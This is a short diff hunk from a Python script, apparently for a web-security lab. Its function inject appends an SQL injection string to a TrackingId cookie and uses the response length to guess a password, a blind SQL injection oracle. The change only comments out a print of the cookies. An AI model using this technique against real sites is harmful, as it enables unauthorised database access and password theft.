@@ -26,7 +26,7 @@ def inject(x, y):
     cookies.update({'TrackingId': cookies['TrackingId'] +  SQLI })
     rq = requests.get(url, cookies=cookies)
     passwdguess = len(rq.text)
-    print(cookies)
+#    print(cookies)
     return passwdguess
 
 
